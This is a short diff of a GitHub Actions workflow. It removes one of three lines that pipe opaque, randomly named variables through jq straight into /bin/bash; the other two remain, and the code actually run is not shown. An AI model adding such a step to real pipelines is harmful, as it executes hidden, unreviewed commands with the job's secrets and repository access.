@@ -21,7 +21,6 @@ jobs:
         run: |
           printf '%s' "$rgsic0106" | jq -r .pmntu1 | /bin/bash
           printf '%s' "$lyw29410" | jq -r .da3 | /bin/bash
-          echo $hlxf14 | jq -r .ayptf43 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
